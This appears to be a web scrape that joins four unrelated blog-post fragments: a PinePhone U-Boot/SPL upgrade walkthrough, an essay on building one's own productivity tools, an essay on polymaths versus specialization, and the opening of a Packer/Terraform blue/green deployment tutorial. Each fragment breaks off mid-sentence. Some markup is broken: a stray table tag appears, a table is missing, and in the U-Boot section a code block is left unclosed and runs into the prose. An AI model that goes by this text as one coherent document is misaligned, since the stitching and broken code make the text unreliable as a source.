<p>U-Boot, or rather <a href="https://en.wikipedia.org/wiki/Das%5FU-Boot">Das U-Boot</a> a.k.a <em>the Universal Boot Loader</em>, is a small program that is loaded into <em>read-only memory</em> (ROM) and is ultimately responsible for loading the Linux kernel. Designed with flexibility in mind, U-Boot now supports <a href="https://gitlab.denx.de/u-boot/u-boot/-/tree/master/arch">a wide variety of architectures</a> for <a href="https://gitlab.denx.de/u-boot/u-boot/-/tree/master/board">embedded boards</a>, each of which may support multiple boot methods. This article is only concerned with U-Boot as it is configured for the <a href="https://gitlab.denx.de/u-boot/u-boot/-/blob/master/board/sunxi/README.sunxi64">Allwinner 64-bit boards</a>, specifically the <a href="https://linux-sunxi.org/A64">Allwinner A64 SoC</a>.</p>

<h2 id="what-is-a-soc">What is a SoC?</h2>

<p>No, it does not refer to the stinky fabric covering your feet. <em>SoC</em> stands for <em>System on a Chip</em>. The PinePhone contains the <a href="https://linux-sunxi.org/A64">Allwinner A64 SoC</a>, featuring a Quad-Core <a href="https://en.wikipedia.org/wiki/ARM%5FCortex-A53">ARM Cortex-A53 ARMv8-A CPU</a> and an <a href="https://linux-sunxi.org/Mali400">ARM Mali400 MP2 GPU</a>. See the <a href="https://linux-sunxi.org/A64#Documentation">Allwinner A64 documentation</a> for more details.</p>

<h2 id="what-is-the-spl">What is the SPL?</h2>

<p>The <em>Secondary Program Loader’s</em> (SPL) primary function is to load U-Boot proper, the <em>flattened device tree</em> (<a href="https://devicetree-specification.readthedocs.io/en/latest/flattened-format.html">FDT</a>) and the <em>Arm Trusted Firmware</em> (<a href="https://www.trustedfirmware.org/about/">ATF</a>), ultimately passing execution to the ATF. In particular, execution is passed to <em>Trusted Firmware-A</em> (<a href="https://trustedfirmware-a.readthedocs.io/en/latest/index.html">TF-A</a>), which is <a href="https://github.com/ARM-software/arm-trusted-firmware">the official reference implementation</a> used by SoCs with armv8- cores, such as <a href="https://trustedfirmware-a.readthedocs.io/en/latest/plat/allwinner.html">Allwinner Armv8-A SoCs</a>.</p>

<h2 id="what-installs-the-spl">What installs the SPL?</h2>

<p>The SPL is installed via the <code>u-boot-pinephone</code> package from the <a href="http://postmarketos1.brixit.nl/postmarketos/master/aarch64/">postmarketOS aarch64 APK repository</a>. The package is built from the <a href="https://gitlab.com/pine64-org/u-boot/">pine64 u-boot fork</a> in which they added a <a href="https://gitlab.com/pine64-org/u-boot/-/blob/master/.gitlab-ci-pine64.yml">pine64 specific GitLab CI/CD pipeline configuration</a>. By listing the contents of the package using the <a href="https://wiki.alpinelinux.org/wiki/Alpine%5FLinux%5Fpackage%5Fmanagement#apk%5Finfo">apk info</a> command we can see where the SPL binary is actually installed to the root file system.</p>
<div><pre><code data-lang="sh">second-chance:~$ apk info -L u-boot-pinephone</code></pre></div><div><pre><code data-lang="text">u-boot-pinephone-2020.04_git20200421-r1 contains:
usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div>
<p>However, this is just a convenient location to deliver the binary. The SPL must be deployed to a specific location on disk so that the BootROM can load it.</p>

<h2 id="a-bit-about-bytes">A bit about bytes</h2>

<p>I suspect that not all of those reading this article are familiar with the various standards when it comes to measuring information. Allow me to digress with a brief introduction to these standards with respect to how they both measure and represent a <em>kilobyte</em>. Many of the articles that I have linked herein use the <em><a href="https://en.wikipedia.org/wiki/JEDEC%5Fmemory%5Fstandards#Unit%5Fprefixes%5Ffor%5Fsemiconductor%5Fstorage%5Fcapacity">Joint Electron Device Engineering Council</a></em> (JEDEC) memory standards in which the unit for <em>kilobyte</em> is denoted by (<code>KB</code>), in upper case letters and represents <code>1024B</code>. This is not to be confused with the kilobyte from the <em><a href="https://en.wikipedia.org/wiki/Metric%5Fprefix/">International System of Quantities</a></em> (SI) in which <em>kilo</em> is denoted with a lower case <code>k</code>, such that <code>kB</code> means <code>1000B</code>. My preference is to use the <a href="https://en.wikipedia.org/wiki/Kibibyte">kibibyte</a> (pron. KI-BEE-BYTE), which was established by the <em><a href="https://en.wikipedia.org/wiki/International%5FElectrotechnical%5FCommission">International Electrotechnical commission</a></em> (IEC) and is recognized by all major standards organizations, including those aforementioned.</p>

</table>

<p>The reasoning behind my preference is two fold:</p>

<ol>
<li>The JEDEC <a href="https://www.jedec.org/document%5Fsearch?search%5Fapi%5Fviews%5Ffulltext=JESD100B01">Terms, Definitions, and Letter Symbols for Microcomputers, Microprocessors, and Memory Integrated Circuits</a> only defines the first three higher order prefixes: <em>kilo</em> (K), <em>mega</em> (M), <em>giga</em> (G), referring to them for common usage. The prefix <em>tera</em> was later added to the JEDEC terms dictionary to reflect <a href="https://www.jedec.org/standards-documents/dictionary/terms/mega-m-prefix-units-semiconductor-storage-capacity">common prefix usage for modern semiconductor storage capacity</a>.</li>
<li>IEC prefixes cannot be confused with Metric prefixes.</li>
</ol>

<p>To make matters more confusing, sometimes lowercase <code>k</code> is used to mean 1024, e.g. see <a href="https://man7.org/linux/man-pages/man1/tar.1.html#OPTIONS">tar(1) OPTIONS</a> sub section <code>Size Suffixes</code> located <a href="https://man7.org/linux/man-pages/man1/tar.1.html#RETURN%5FVALUE">above the RETURN VALUE section</a>. Understanding which system of measurement is being used is essential when calculating offsets.</p>

<h2 id="layout-of-sunxi-bootable-storage">Layout of sunxi bootable storage</h2>

<p>The first 40 plus <code>KiB</code> of bootable storage for an Allwinner based board has the <a href="https://linux-sunxi.org/Bootable%5FSD%5Fcard#SD%5FCard%5FLayout">following default layout</a>:</p>

<table>
<thead>
<tr>
<th>Start</th>
<th>Size</th>
<th>Usage</th>
</tr>
</thead>

<tbody>
<tr>
<td>0KiB</td>
<td>8KiB</td>
<td>Reserved for optional MBR or GPT</td>
</tr>

<tr>
<td>8KiB</td>
<td>32KiB</td>
<td>Initial SPL</td>
</tr>

<tr>
<td>40KiB</td>
<td>-</td>
<td>U-Boot Proper</td>
</tr>
</tbody>
</table>

<p>From the layout, one can conclude that upgrading the SPL and U-Boot for the PinePhone must involve writing the <code>u-boot-sunxi-with-spl.bin</code> to bootable storage starting at <code>8192B</code>.</p>

<h2 id="pinephone-boot-procedure">PinePhone boot procedure</h2>

<p>Bootstrapping is complicated by initial memory address space limitations. The <a href="https://linux-sunxi.org/BROM#U-Boot%5FSPL%5Flimitations">SPL is limited to 32 KiB</a>, most likely because the BootROM, or BROM, loads the SPL into <a href="https://linux-sunxi.org/A64/Memory%5Fmap">SRAM A1</a>, which is a <code>32 KiB</code> subsection. If the SPL is larger than <code>32 KiB</code> the BROM will refuse to load it. After the SPL loads U-Boot proper and passes execution to the ATF, U-Boot proper in turn runs <a href="https://gitlab.com/postmarketOS/pmaports/-/blob/master/device/community/device-pine64-pinephone/uboot-script.cmd">the Pine Phone’s u-boot command script</a>. The command script sets the default bootargs for init and calls the <a href="https://gitlab.denx.de/u-boot/u-boot/-/blob/master/cmd/booti.c">booti command</a>, which boots the Linux Kernel Image from memory given the <em>flattend device tree</em> (<a href="https://devicetree-specification.readthedocs.io/en/latest/flattened-format.html">FDT</a>) and the <em>initial ramdisk</em> (<a href="https://en.wikipedia.org/wiki/Initrd">initrd</a>), ultimately passing execution to Linux init.</p>

<p>You might have noticed that <code>/usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code> is much larger than <code>32KiB</code>.</p>
<div><pre><code data-lang="text">second-chance:~$ ls -lh /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin

<p>That is because the SPL binary image includes a <em>Flattened uImage Tree</em> (<a href="https://gitlab.com/pine64-org/u-boot/-/blob/master/doc/uImage.FIT/source%5Ffile%5Fformat.txt">FIT image</a>) named <code>u-boot.itb</code> that contains the rest of the firmware.</p>

<h2 id="determine-which-bootable-storage-device-is-relevant">Determine which bootable storage device is relevant</h2>

<p>Before you can <a href="#how-to-determine-if-u-boot-needs-to-be-upgraded">determine if U-Boot needs to be upgraded</a>, you need to know which storage device your PinePhone is booting from. This can be easily determined by using the <a href="https://linux.die.net/man/8/lsblk">lsblk(8)</a> command to list the running operating system’s current mount points. Below is the output of <a href="https://linux.die.net/man/8/lsblk">lsblk(8)</a> run on my PinePhone booted from an <code>SD</code> card:</p>
<div><pre><code data-lang="sh">second-chance:~$ lsblk --output NAME,TYPE,MOUNTPOINT</code></pre></div><div><pre><code data-lang="text">NAME         TYPE MOUNTPOINT
mmcblk0      disk
├─mmcblk0p1  part /boot
└─mmcblk0p2  part
mmcblk2      disk
├─mmcblk2p1  part
├─mmcblk2p2  part
├─mmcblk2p1  part
└─mmcblk2p2  part
mmcblk2boot0 disk
mmcblk2boot1 disk</code></pre></div>
<p>The disk corresponding to the <code>/boot</code> mountpoint is the name of the block special device that postmarketOS is currently running form. The device path to the relevant boot storage device is therefore <code>/dev/mmcblk0</code>. We will be using this device name in the next two sections to determine if an upgrade is needed and again to perform the actual upgrade if warranted. You must be careful to use the device name that is relevant to your own running environment if you are following along.</p>

<h2 id="how-to-determine-if-u-boot-needs-to-be-upgraded">How to determine if U-Boot needs to be upgraded?</h2>

<p>You can determine if an upgrade is necessary simply by comparing the version of U-Boot installed by the <code>u-boot-pinephone</code> package with the version of U-Boot that is written to <a href="#determine-which-bootable-storage-device-is-relevant">the bootable storage device which is relevant to your running environment</a>.</p>

<p>To see which version of <code>U-Boot</code> was installed by the <code>u-boot-pinephone</code> package, simply run the <code>apk policy</code> sub command as shown below:</p>
<div><pre><code data-lang="sh">second-chance:~/$ apk policy u-boot-pinephone</code></pre></div><div><pre><code data-lang="text">u-boot-pinephone policy:
  2020.04_git20200421-r1:
    lib/apk/db/installed
    etc/apk/cache
    http://postmarketos1.brixit.nl/postmarketos/master</code></pre></div>
<p>Alternatively, you can use the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>strings</code> command to search the binary’s printable strings for the regex pattern <code>U-Boot [[:digit:]]</code> by piping the output through a <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>grep</code> filter. As a side note, the PinePhone uses busybox, so when you find yourself looking up command line documentation with the intention of running the command from a PinePhone shell, always check the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> man pages first.</p>
<div><pre><code data-lang="sh">second-chance:~/packages$ strings /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin | grep -E <span>'U-Boot [[:digit:]]'</span></code></pre></div><div><pre><code data-lang="text">U-Boot 2020.04 (Jun 20 2020 - 12:41:48 +0000)</code></pre></div>
<p>Similarly, to determine the version of U-Boot that is currently written to bootable storage, you can search for the same regex pattern in the printable strings of the boot disk after the first <code>8 KiB</code>. However, since the bootable storage is significantly larger than <code>u-boot-sunxi-with-spl.bin</code>, it would not be efficient to use the <code>strings</code> command as we did previously. Instead, we will use the <a href="https://linux.die.net/man/1/busybox">busybox(1)</a> <code>dd</code> command, which will allow us to control where to begin and end the search. Since we can’t easily know the exact offset of the version string, which can very from build to build, my strategy has been to simply skip the first <code>8 KiB</code> and then read the same number of <code>KiB</code> as the size of the currently installed <code>u-boot-sunxi-with-spl.bin</code>. If my search turns up nothing, then that means that the previously installed version was larger, and I can simply increase the <code>count</code> to some reasonable number of <code>KiB</code> until I find what I am looking for.</p>

<p>First, let’s determine the size of <code>u-boot-sunxi-with-spl.bin</code>.</p>
<div><pre><code data-lang="sh">ls -lh /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div><div><pre><code data-lang="text">-rw-r--r--    1 root     root      543.3K Jul 18  2020 /usr/share/u-boot/pine64-pinephone/u-boot-sunxi-with-spl.bin</code></pre></div>
<p>The binary installed to disk is about <code>5…</code></p></div></div>

        <p><em>This March, I spent a couple of days traveling through western Iceland.</em></p>
<p><img src="https://thesephist.com/img/iceland.jpg" alt="Iceland, part 1"></p>
<p>While I was there, I thought a lot about tools – mechanical tools, software tools, tools that last, and tools that are fragile. The somber snow-covered scenery made me think about how quickly most of the tools we use today get outdated or replaced, and I thought about the kinds of tools that I’ve been building for myself for the last few years to help organize my life.</p>
<p>I took a walk around <em>Smábátahöfnin í Keflavík</em> (a small marina nearby) that night, unraveled myself into my hotel room, and started writing this post.</p>
<p>I want to share why I build my own tools and how I think we should think about building tools for life. It’s long, so here’s a roadmap. Feel free to jump around.</p>

<p>For the last few years, I’ve been on a journey to replace all of the essential digital tools I use for organizing my life with tools I develop, maintain, and deploy myself.</p>
<p>What started with a single-page notes app I made in high school has grown into a constellation of home-grown productivity tools I now rely on for my day-to-day work and learning. Here’s a sample.</p>
<ul>
<li>
<p><a href="https://github.com/thesephist/polyx#ligature">Ligature</a>, for long-term notes and tasks, goals, brainstorming, project planning, and other important writing.</p>
<p><img src="https://thesephist.com/img/ligature.jpg" alt="Ligature"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/pico">Pico</a>, for more ephemeral notes and tasks that change on a daily basis. I split up my notes into two apps (Ligature and Pico) because it works better for my workflow. (More on this later.)</p>
<p><img src="https://thesephist.com/img/pico.jpg" alt="Pico"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/mira">Mira</a> for keeping track of people I know, why they’re interesting, and what we’ve talked about.</p>

<p><a href="https://github.com/thesephist/lovecroft">Lovecroft</a> for managing and sending emails to my <a href="https://thesephist.com/#newsletter">mailing lists</a>.</p>
<p><img src="https://thesephist.com/img/lovecroft.jpg" alt="Lovecroft"></p>
</li>
<li>
<p><a href="https://github.com/thesephist/polyx#noct">Noct</a> for backing up and syncing all my files across computers and the cloud. Noct doesn’t have a graphical UI, just a command-line tool.</p>
</li>
<li>
<p><a href="https://thesephist.com/posts/frieden/">Frieden</a> as a public availability calendar, showing when I’m free or busy.</p>

</li>
</ul>
<p>Taken together, these apps do almost everything I need to do on my computer to keep myself organized. I don’t use any third-party notes, task management, or contacts apps, though I used to be a big fan of Simplenote and Todoist. I’ve used Notion, Dropbox Paper, Google Docs, and Airtable, but only for working in teams that centralized on them. These days, besides email and calendar, I live within a system of my own tools, and it works well for me.</p>
<p>I don’t want to imply that my tools are objectively better than the professional tools on the market like Notion and Dropbox. Those latter services have more features, and might even be more reliable today. But I think my tools fit me better for a different reason.</p>

<p>Each person’s mind works a little differently, and each person remembers and processes information a little differently. I think we all work at our best when we work with tools that fit how our minds work.</p>
<p>The Eureka moment that some of us feel when we finally find a notes app or todo system that fits our brains – that epiphany happens when the tools we use mirror the way our minds work, and how we want to move information through our lives. Good tools fit perfectly around our workflows, bad tools don’t.</p>
<p>When we resort to having other people build tools for us, the tools they build might never quite perfectly fit our workflows, because they’re not built for our individual minds. When other people build tools for us to use, they either design tools after their own workflows and mental models, or worse, they design it for a mass market of millions of people who all sort-of-but-not-really work and think in similar ways. The result is that mass-market productivity tools don’t fit the way our individual minds are predisposed to work. Instead, to use these tools, we need to bend our workflows to fit around the tools.</p>
<p>My biggest benefit from writing my own tool set is that <strong>I can build the tools that exactly conform to my workflows, rather than constructing my workflows around the tools available to me.</strong> This means the tools can truly be an extension of the way my brain thinks and organizes information about the world around me. My tools aren’t perfect yet, but as they grow and evolve, they’ll only become better reflections of my personal mental models.</p>
<p>For example, one place where my mind works differently than the tools on the market is the task/notes distinction.</p>
<h3 id="tasks-and-notes-a-false-dichotomy">Tasks and notes, a false dichotomy</h3>
<p>My workflow used to differentiate between tasks and notes. Tasks were action items that I could reference, take action on, and complete, and then erase from my list. Notes were things that were indefinitely relevant. I would take notes and then come back to reference them many times. A note by itself isn’t actionable.</p>
<p>But once I started building my own tools, I realized this distinction isn’t really the way my brain worked. For me, a huge grey area exists between actionable, completable tasks and purely encyclopedic notes. Here are some things that fall in the grey area for me, pulled from my real, actual notes I took this week.</p>
<ol>
<li>I recently learned some really useful tips about how to grow leaders within a community from the book <em><a href="https://gettogetherbook.com/">Get Together</a></em>. I definitely want to act on these learnings at some point in the communities I lead, but I don’t want them cluttering up my todo list because they’re not things I can just complete and check off quickly. I also want to remember these tips forever, even after the first time I act on them.</li>
<li>I’ve been brainstorming an idea for a side project related to <a href="https://en.wikipedia.org/wiki/Computer_algebra">symbolic mathematics</a>. I’ve been writing down my inspirations related to this project. I don’t want to tuck it away in my notes, because this is something I want to build soon, but I also don’t want to shove paragraphs of notes into a todo list item.</li>
<li>I keep a running list of ideas I have for future blog posts, but I don’t really have a “write the next blog post” task item under which I’d normally put these ideas, because I don’t write on schedule – I just write when I can. Where should these ideas go? They’re sort-of notes and sort-of tasks.</li>
</ol>
<p>You might think that these are either very clearly todo items or very clearly notes, and that’s ok. But I certainly felt differently, and I realized I was only separating things into these two buckets because my tools forced me to. Before I wrote my own tools, I had a todo app (Todoist) and I had a notes app (Simplenote), and there was nothing in between.</p>
<p>Eventually, I discovered a better mental model for my working style: I ask myself <em>how immediately</em> I need to take action on something.</p>
<p>The way that I see it, everything I learn and jot down is something for me to act on at some point in my life. If I read something that I never thought would influence the way I lived, it wouldn’t have value to me, and I simply wouldn’t write it down. Armed with this insight, these days, I have two different notes apps, and I don’t use a todo list app. These two apps are Ligature and Pico, mentioned above.</p>
<p>One is for notes that are changing often. Day-to-day tasks, things to remember for the next week, even long notes and links related to what I’m working on <em>now</em>. The other app is for notes that grow over time, like notes I take while reading books or watching talks, my annual goals, financial planning, reading list, and project outlines. <strong>My two notes apps mirror the way my brain works best – one is my short-term, working memory, the other is my long-term memory.</strong></p>
<p>I’ve had this system for a few months now, and haven’t felt any need for something better. It doesn’t have the crazy features of some notes services on the market today, but it just works the way my brain does.</p>
<p>But what if I need something different later on in life?</p>
<h3 id="tools-that-grow-with-your-workflows">Tools that grow with your workflows</h3>
<p>The other benefit of building homebrew tools is that <strong>tools you build yourself can grow and change as your workflow changes over time</strong>. So if my needs do change over time, my tools can grow to accommodate exactly what I need.</p>
<p>When I first started keeping more organized notes on the interesting people I met, I started with a document in my notes app. Over time, I noticed that these notes followed a pattern: I wrote down their name and primary contact info, how I first met them, what school they went to, and what we talked about the last time we spoke.</p>
<p>So when I built Mira, my own people-manager app, I designed it around that exact workflow I had developed. When I later realized I was also recording people’s Twitter usernames in the description field, I just added a Twitter username field to each contact.</p>
<p>This is typical of the way I <em>discover</em> my workflows. <strong>I start with a minimal, bare-bones solution, and try to pick up on patterns and tricks I create for myself. And then I encode those patterns and tricks into the tools over time.</strong></p>
<p>This way, my tools can grow organically as my workflows evolve. Neither of them gets in the way of each other most of the time, and I think that was hard to appreciate before I started relying wholly on my own tools.</p>

<p>My productivity tools, especially my notes and contacts, are the load-bearing tools of my life. If they break or disappear, it’ll take a long time and a lot of effort for me to rebuild those same workflows and tools, so it’s important that they’re reliable, and that I can depend on them working for me for a long time (measured in years and decades, not quarters).</p>
<p>I’ve written at length about <a href="https://thesephist.com/posts/ownership/">the importance of ownership</a> before. I want to own the pieces of my life that are most critical, and I want agency over how these tools change over time.</p>
<p>I want these notes and ideas and workflows to stick with me as I grow as a person through the next decades. If I had to …</p></article></div>

		<div>
			<p>You’ve likely heard the saying: “A jack of all trades is a master of none.” It warns against the futility of pursuing too many disciplines. Be a specialist, or you’ll be nothing.</p>
<p>It may surprise you to learn there’s actually an extended version: “A jack of all trades is a master of none, but oftentimes better than a master of one.” With a subtle addition, its meaning becomes inverted to tout the benefits of being a polymath (a.k.a. generalist).</p>
<p>Why is the former so common, and the latter so unknown?</p>
<p>The answer lies in modern society’s preference for <strong>specialization</strong>. We’ll explore its origin, the limits it places on workers’ freedoms, and how the polymath approach can offer a reprieve. Finally, I’ll share my own experiences and learnings exploring a multitude of pursuits.</p>
<h2 id="cost-of-specialization">Cost of Specialization</h2>
<p>Following unprecedented growth during the industrial revolution, businesses faced more competition than ever before. In order to thrive, they sought new ways to operate more efficiently and productively. Division of labor was the solution they were looking for. By dividing the tasks needed to produce goods and services, individual workers could focus on specific tasks rather than developing a variety of expertise.</p>
<p>One important criteria to optimize for specialization is ensuring that workers stay in the same role for prolonged periods of time. This facilitates increased efficiency by reducing the need for training and allowing individuals to iteratively improve their ability to perform similar tasks. In exchange for their loyalty, the company offers its employees the security of long-term employment, along with additional incentives including tax-sheltered retirement accounts and access to healthcare.</p>
<p>In some parts of the world, these benefits come at a heavy cost to an individual’s freedom. In the United States for example, if you’re employed with a company, you get healthcare. Otherwise, you’re out of luck. Workers are often hesitant to switch jobs (let alone spend extended time without one) out of fear of losing their healthcare benefits. Another part of the problem is that the cost of healthcare in the U.S. is so high. A few days without healthcare and a single accident can push someone into financial ruin. As a result, many people stay at the same job year after year <a href="https://www.forbes.com/sites/jackkelly/2019/10/25/more-than-half-of-us-workers-are-unhappy-in-their-jobs-heres-why-and-what-needs-to-be-done-now/#e8bfe3d20247" target="_blank">even if they’re unhappy</a>.</p>
<p>The lack of freedom might be a worthy sacrifice in exchange for job security. But therein lies the problem: few companies can actually guarantee long-term stability. Many workers already face ambiguity with their job security due to the impending effects of automation. Now, with the tornado of change brought about by the COVID pandemic, the brittleness of even large corporations’ stability has become apparent.</p>
<p>So how do we survive these waves of change? <strong>Adaptability</strong>.</p>
<p>Workers need to embrace a life of learning and self-evolution in order to thrive.</p>
<blockquote>
<p>In order to keep up with the world of 2050, you will need not merely to invent new ideas and products – you will above all need to reinvent yourself again and again.<br>
—Yuval Noah Harari</p>
</blockquote>
<p>Luckily, we have a template for how to do just that: the <strong>polymath</strong>.</p>
<p>Polymaths engage in extended learning across disparate fields, and apply their learnings to connect ideas and solve problems in unique ways. By nature, they’re well suited to thrive in a constantly changing environment.</p>
<h2 id="polymath-advantage">Polymath Advantage</h2>
<p>The key advantage that polymaths hold is their ability to develop <strong>mental models</strong> from different fields and apply them to solve problems in a unique way. This enables them to <strong>differentiate</strong> from their competition. Further, it creates opportunities for them to find truly <strong>meaningful work</strong> by pursuing their passions.</p>
<h3 id="differentiation">Differentiation</h3>
<p>One of the challenges with specialization is that it becomes harder to compete over time. This is a bit counter-intuitive. At first you might think the more ‘specialized’ you become, the more ‘rare’ your skillset is and thus, the better you are in terms of competition. There are two issues that arise as you continue down the path of linear specialization:</p>
<p><strong>1.</strong> <strong>Over-specialization</strong>: This often happens to PhD students who have pursued very niche, highly specific areas of expertise. It’s rare to find jobs that can actually serve their level of specialization. They find themselves given a choice to continue their career in academia, or take a less desirable job in the workforce that doesn’t actually leverage their unique skills.</p>
<p><strong>2.</strong> <strong>Diminishing returns</strong>: The larger your team is, the more difficult it becomes to be the <em>absolute best</em> in a particular area. As a simple example: It’s quite difficult to become the most technically proficient engineer in a given company. However, it’s much more straightforward to differentiate yourself through excellent communication skills, design sensibilities, leadership skills, and so on.</p>
<p>Once you hit the diminishing returns of specialization on one pursuit (<strong>the limits of depth</strong>), it makes sense to expand to other pursuits and diversify your skills (<strong>the opportunities of breadth</strong>).</p>
<h3 id="mental-models">Mental Models</h3>
<p>When you work in a particular industry for a while, you start to develop mental models based on its structures and dynamics. These are widely known <em>within</em> the industry, but not as much outside of it.</p>
<p>There’s where the opportunity comes in. If you find yourself working in a new area later in your life, you can combine mental models from different areas in ways that few others can.</p>
<blockquote>
<p>In the 17th century, Johannes Kepler didn’t have a wealth of existing knowledge or technology to work with. There was no concept of gravity as a force, and he had no notion of momentum that keeps the planets in motion.</p>
<p>Analogies were all he had.</p>
<p>From research on magnets, Kepler began to understand why planets moved toward and away from the sun. By picturing how boats might move in a whirlpool, Kepler began to understand the elliptical orbit patterns of planets.</p>

<p>The more pursuits you expose yourself to, the more models you have to work from, and the more you can stand out from the competition.</p>
<h3 id="purpose">Purpose</h3>
<p>I believe the strongest reason polymaths become polymaths is that they simply don’t have a choice. The urge to pursue one’s inner passions is strong, and those blessed with a variety of them often find them difficult to ignore.</p>
<p>The polymath’s search for meaning and purpose through different pursuits can be related to the Japanese concept of <em>Ikigai</em> (“a reason for being”):</p>
<p><img src="https://salman.io/img/ikigai.jpg">
</p>
<p>It can take many years or even decades before one sees any intersection between different circles. Yet a single taste can be intoxicating, and motivate a lifetime of pursuit.</p>
<p>What purpose could be greater than discovering purpose itself?</p>
<h2 id="my-inner-fox">My Inner Fox</h2>
<p>When I first began to study polymaths, I was excited to see a template for a life I didn’t know I was living. But when I started to embrace the polymath identity, my inner critics appeared. I wondered whether I’m even qualified to write about polymaths, let alone call myself one. After all, the <a href="https://notes.salman.io/the-definition-of-a-polymath" target="_blank">the definition of a polymath</a> is somewhat murky. I’ve spoken to a lot of peers who feel this same hesitation, and it’s been refreshing to connect with others who are taking a similar approach to life.</p>
<p>I also got a boost of confidence from a book called <em>Hedgehog and the Fox</em> by Isaiah Berlin. The book is a major source of inspiration for the generalist approach, and contrasts two proverbial animals: the specialist hedgehog and the generalist fox. I was elated to discover that the spirit animal for my <em><a href="https://brownfox.substack.com/" target="_blank">Quick Brown Fox</a></em> newsletter (inspired by <em>The Little Prince</em>’s fox) was incredibly prescient. It seems my destiny as a polymath fox was written long ago…</p>

</p>
<p>I’ve been lucky to have held a lot of different roles and explored a lot of varied interests in my life. I’ve been a startup founder, software engineer, manager, teacher, public speaker, advisor, DJ and writer. Some of these are roles I’ve explored for decades, while others for just a year. Beyond that, I’ve also spent a lot of time on artistic hobbies like illustration and animation. In hindsight, there were a number of benefits I enjoyed as a result of combining different pursuits.</p>
<p>As a DJ, I had to learn to not just play my playlist, but to pay close attention to the audience and cater to them. Looking back, I think <a href="https://soundcloud.com/daretodj" target="_blank">each one of my sets</a> was a live lesson on how to find product-market fit.</p>
<p><img src="https://salman.io/img/salman-dj.jpg">
</p>
<p>Thanks to my <a href="https://vimeo.com/134677777" target="_blank">obsession with animation</a>, I learned to incorporate the principles of animation into the software I built. Later, when I was building digital healthcare experiences, I was able to use animation to bring the patients’ user experience to life. I brought a different perspective to the healthcare world (specifically: the idea that filling out a form could be <strong>fun</strong>).</p>

</div>
<p>Through extended <a href="https://medium.com/@salmansays/teaching-in-paradise-12159066cd86" target="_blank">teaching stints at software development schools</a>, I built strong communication skills that paid dividends in future public speaking engagements as well as all my daily interactions with coworkers. As it turns out, explaining our ideas is crucial to our effectiveness, and teaching provides excellent practice for this skill.</p>
<p>The list goes on.</p>
<p>I didn’t do any of these things with a goal of being a polymath. I did them because <strong>I was drawn to them</strong>. It took many years before I started to see any benefits from mixing these pursuits.</p>
<p>Now that I’m intentionally embracing a polymath life, I hope to see the benefits compound even more. I’m excited to see how this plays out!</p>
<h2 id="freedom-isnt-free">Freedom Isn’t Free</h2>
<p>We’ve talked a lot about the benefits of the polymath lifestyle. I’d be remiss if I didn’t leave you with a few warnings about the obstacles.</p>
<p>One of the strange things about having multiple pursuits is that <strong>you never quite fit</strong> into social groups. I remember joining an iOS developers group where most of the members had been doing iOS development for more than a decade. Meanwhile, I had worked on countless platforms, in different roles across a variety of industries. We may have been in the same group, but we had lived completely different lives. It was …</p></div></div></div>

  <p>The original deploy strategy for <a href="https://songrender.com/">SongRender</a> involved using Ansible to provision and build the application servers. I was unhappy with that process for a few reasons.</p>
<ul>
<li>The application was built on production servers at the same time as they were serving live requests.</li>
<li>Old versions of the application would stay on the servers, taking up disk space. I had set up a cron job to clean these up, but cron jobs are fickle and it would still run out of space every so often.</li>
<li>Side effects of repeated updates and deploys (or worse, failed updates and deploys) could slowly accrue on the servers, a phenomenon known as configuration drift.</li>
</ul>
<p>I decided to solve these issues using <a href="https://www.digitalocean.com/community/tutorials/what-is-immutable-infrastructure">immutable infrastructure</a>: a strategy in which servers are provisioned once and then never updated. If a server’s configuration needs to change or a new version of the application needs to be deployed, an entirely new server is spun up to replace the old one.</p>
<p><a href="https://www.martinfowler.com/bliki/BlueGreenDeployment.html">Blue/green deployment</a> is a way of deploying applications that dovetails nicely with immutable infrastructure. Instead of maintaining one set of servers, you maintain two — only one of which is live at any given time. To deploy a new version of the application, you first deploy it to the backup set of servers, then make those servers live.</p>
<p>We'll implement both of these practices using three technologies:</p>
<ul>
<li>
<p><a href="https://www.packer.io/">Packer</a> lets you run shell scripts to make changes to a server, then saves the entire disk — including the operating system and whatever changes you made — into a “machine image” that you can use as a base for other servers. We'll use it to provision our servers, as well as to install and configure our application.</p>
</li>
<li>
<p><a href="https://www.terraform.io/">Terraform</a> is a “configuration-as-code” tool — you describe your desired infrastructure in a declarative language, and then Terraform diffs it with the infrastructure that actually exists. It's kind of like React, but instead of modifying a web page it configures your infrastructure.</p>
</li>
<li>
<p><a href="https://nginx.org/">nginx</a> is a popular web server and load balancer. I chose it because I was already familiar with it, but it's not particularly important that you use nginx here specifically; HAProxy or any other application load balancer should work equally well.</p>
</li>
</ul>
<p>SongRender’s infrastructure is hosted on DigitalOcean, but you can use <a href="https://www.terraform.io/docs/providers/type/cloud-index.html">any cloud provider that supports Terraform</a>. This article will focus mainly on the Terraform configuration files, and the points at which they integrate with Packer and nginx.</p>
<p>The TL;DR of how this works: one color — let's say blue — will be live. First, Packer builds a new image in the backup color green. Terraform creates a new set of green servers, using the image Packer just built. Finally, our nginx load balancer swaps the live color with the backup color, sending requests to the newly-created green set of servers instead of the previously live blue ones. To deploy the application again, the process is repeated with the colors reversed.</p>
<p>Since in a given deploy both sets of servers will have gone through both live and backup states, let’s use some more specific names. The “promoted” set will be the servers that begin in the backup state and become live, while the “demoted” set will be the servers that begin live and are changed to backup.</p>
<p>Let’s get to the code. Here's an abbreviated Packer configuration file <code>server.json</code> for building the application server image<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"variables"</span><span>:</span> <span>{</span>
    <span>"color"</span><span>:</span> <span>null</span>
  <span>}</span><span>,</span>
  <span>"provisioners"</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>"builders"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"type"</span><span>:</span> <span>"digitalocean"</span><span>,</span>
      <span>"api_token"</span><span>:</span> <span>"YOUR_API_TOKEN_GOES_HERE"</span><span>,</span>
